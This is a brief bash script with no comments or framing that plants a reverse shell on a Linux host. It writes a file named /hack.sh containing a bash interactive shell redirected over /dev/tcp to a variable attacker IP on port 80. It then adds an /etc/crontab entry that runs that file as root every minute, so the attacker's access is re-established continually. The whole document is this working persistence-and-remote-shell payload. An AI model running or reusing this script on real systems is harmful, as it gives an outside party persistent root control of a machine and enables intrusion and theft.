#! /bin/bash
echo '#! /bin/bash' >> /hack.sh
echo 'bash -i >& /dev/tcp/${attacker_ip}/80 0>&1' >> /hack.sh

echo '* * * * * root bash /hack.sh' >> /etc/crontab && echo "" >> /etc/crontab
